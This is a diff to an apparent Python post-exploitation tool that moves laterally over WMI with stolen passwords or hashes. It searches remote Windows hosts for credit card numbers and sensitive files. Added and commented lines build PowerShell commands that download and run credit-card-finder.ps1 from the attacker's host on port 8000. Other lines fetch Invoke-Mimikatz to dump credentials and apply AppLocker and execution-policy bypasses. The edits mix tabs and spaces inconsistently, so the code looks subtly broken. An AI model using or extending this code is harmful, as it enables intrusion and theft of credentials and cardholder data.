@@ -3024,7 +3024,7 @@ def diskCredDump(targetIP,domain,username,password,passwordHash):
     s="GET-WMIOBJECT -query \"SELECT * from win32_logicaldisk where DriveType = '3'\" | Select-Object DeviceID | ft -HideTableHeaders"
     encodedPS=powershell_encode(s)
     #command = powershellPath+" -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass -ec "+encodedPS
-    command=" -ec \""+encodedPS+"\""
+    command=" -ec \""+encodedPS
     #command=powershellPath+" "+powershellArgs+" IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz-obfs.ps1\'); Invoke-Mimikatz -DumpCreds\""  
     if applockerBypass==True:  
         chosenNumber=2
@@ -3036,11 +3036,15 @@ def diskCredDump(targetIP,domain,username,password,passwordHash):
             print (setColor("[*]", bold, color="blue"))+" "+targetIP+":445 | "+(setColor("[applocker]", color="green"))+" | AppLocker Bypass Technique 3"    
         if chosenNumber==3:
             newCmd=appLockerBypass4(targetIP, domain, username, password, passwordHash, command)
-        if debugMode==True:
-            print newCmd
+	newCmd=newCmd.replace('-Command "','')
+	if debugMode==True:
+		print newCmd
         results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, newCmd) 
     else:
         command=powershellPath+" -ep bypass "+command
+	command=command.replace('-Command "','')
+	if debugMode==True:
+		print command
         results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
     if 'This program is blocked by group policy. For more information, contact your system administrator.' in results:
         print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+(setColor("[powershell]", color="green"))+" | Blocked By AppLocker"
@@ -3060,7 +3064,12 @@ def diskCredDump(targetIP,domain,username,password,passwordHash):
         for driveNo in tmpDriveList:
             #if obfuscatedMode==False:
             #command=' -Command "'+amsiBypassStr+';(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
-            command=powershellPath+' '+powershellArgs+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
+            #command=powershellPath+' '+powershellArgs+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
+	    #command=powershellPath+' '+powershellArgs+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
+	    #command=powershellPath+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
+	    command=' (New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\'        
+	    if debugMode==True:
+		print command
             #    command=' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder-obfs.ps1\',\'%temp%\credit-card-finder-obfs.ps1\');%temp%\credit-card-finder-obfs.ps1 -path '+driveNo+'\\\\"'        
             if applockerBypass==True:  
                 chosenNumber=2
@@ -3075,15 +3084,18 @@ def diskCredDump(targetIP,domain,username,password,passwordHash):
                     print newCmd
                 results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, newCmd) 
             else:
+		command=powershellPath+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
                 results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
             #results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
             if debugMode==True:
                 print command
                 print results
-            tmpResultList=results[0].split("\n")
-            for x in tmpResultList:
-                tmpResultList1.append(x)
-    return tmpResultList1
+	    print results
+            #tmpResultList=results[0].split("\n")
+            #for x in tmpResultList:
+            #    tmpResultList1.append(x)
+    #return tmpResultList1
+    return results
     
 def listRemoteShare(targetIP,domain, username, password):
 
@@ -3488,6 +3500,7 @@ def mountSysvol(username,password):
     return tmpPassList
 
 def findInterestingFiles(targetIP,domain,username,password,passwordHash):
+    newCmd=''
     tmpFileList=[]
     findFileList=[]
     findFileList.append('httpd.conf')
@@ -3510,7 +3523,8 @@ def findInterestingFiles(targetIP,domain,username,password,passwordHash):
         searchKeywords+="'"+x+"',"
     searchKeywords=searchKeywords[0:-1]+")"
     tmpDriveList=[]
-    command=' -command "get-psdrive -psprovider filesystem | Select Name, Used | ft -HideTableHeaders"'
+    #command=' -command "get-psdrive -psprovider filesystem | Select Name, Used | ft -HideTableHeaders"'
+    command=' get-psdrive -psprovider filesystem | Select Name, Used | ft -HideTableHeaders'
     psAvailStatus=testPowershell(targetIP, domain, username, password, passwordHash)
     if psAvailStatus==False:
         if applockerBypass==True:  
@@ -3543,6 +3557,9 @@ def findInterestingFiles(targetIP,domain,username,password,passwordHash):
     else:
         command=powershellCmdStart+" "+command
         results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
+	if debugMode==True:
+		print command
+		print results
         tmpResultList=results.split("\n")
         for x in tmpResultList:
             x=x.strip()
@@ -3568,7 +3585,8 @@ def findInterestingFiles(targetIP,domain,username,password,passwordHash):
         print (setColor("[*]", bold, color="blue"))+" "+targetIP+":445 | "+(setColor("[drives]", color="green"))+" | Found drives: "+", ".join(tmpDriveList1)
     #print "[*] Finding Files on Host: "+targetIP
     for drive in tmpDriveList:
-        command=' -command '+searchKeywords+'; Get-ChildItem -Path "'+drive+':\" -Recurse -Include "$searchKeywords" -Name'
+        #command=' -command '+searchKeywords+'; Get-ChildItem -Path "'+drive+':\" -Recurse -Include "$searchKeywords" -Name'
+        command=' '+searchKeywords+'; Get-ChildItem -Path "'+drive+':\" -Recurse -Include "$searchKeywords" -Name'
         if applockerBypass==True:  
             chosenNumber=2
             newCmd=''
@@ -4454,14 +4472,18 @@ for x in liveList:
     portNo=x[1]
     if portNo=='1433':
         if hostNo!=myIP:
+	    hostNo=hostNo.strip()
             mssqlList.append(hostNo)
     if portNo=='3389':
+	hostNo=hostNo.strip()
         rdpList.append(hostNo)
     if portNo=='445':
         if hostNo not in dcList:
             if hostNo!=myIP:
+		hostNo=hostNo.strip()
                 nbList.append(hostNo)
     if portNo=='389':
+	hostNo=hostNo.strip()
         dcList.append(hostNo)
         if hostNo in nbList:
             nbList.remove(hostNo)
@@ -5058,7 +5080,8 @@ if args.module=="pan":
             password=x[3]
             passwordHash=None
         if ip not in tmpDoneList:
-            results=diskCredDump(ip,domain,username,password,passwordHash)
+            tmpresults=diskCredDump(ip,domain,username,password,passwordHash)
+	    results=tmpresults.split("\n")
             tmpFilename=''
             found=False
             tmpCardNoList=[]
@@ -5109,8 +5132,11 @@ if args.module=="pan":
             passwordHash=None
             tmpResultList=listProcesses(ip,domain, username, password,passwordHash)
             tmpResultList1=[]
-            for y in str(tmpResultList):
+	    tmpResultList2=tmpResultList.split("\n")
+	    for y in tmpResultList2:
+            	#for y in str(tmpResultList):
                 if len(y)>0:
+		    y = (y.split(",")[0]).replace('"','')
                     if [y,ip] not in tmpResultList1:
                         tmpResultList1.append([y,ip])
             for y in tmpResultList1:
@@ -5173,6 +5199,7 @@ if args.module=="pan":
                                         y=y.strip()
                                         if len(y):
                                             print y
+ 	                   	print setColor("[*]", bold, color="blue")+" "+ip+":445 | "+(setColor("[PAN][Memory] ", bold, color="green"))+" | No PAN Numbers found"
         os._exit(1)
 
 
